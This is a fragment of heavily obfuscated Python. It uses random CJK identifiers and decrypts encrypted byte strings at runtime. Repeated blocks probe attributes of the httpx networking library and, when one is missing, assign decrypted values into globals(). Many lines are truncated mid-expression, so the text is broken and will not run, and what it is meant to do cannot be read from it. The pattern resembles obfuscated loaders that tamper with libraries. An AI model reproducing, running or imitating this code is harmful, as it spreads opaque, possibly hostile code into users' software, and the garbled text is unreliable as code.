樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx')._urlparse
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx')._urls
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx')._utils
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx').codes
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()

try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx').create_ssl_context
        except AttributeError:
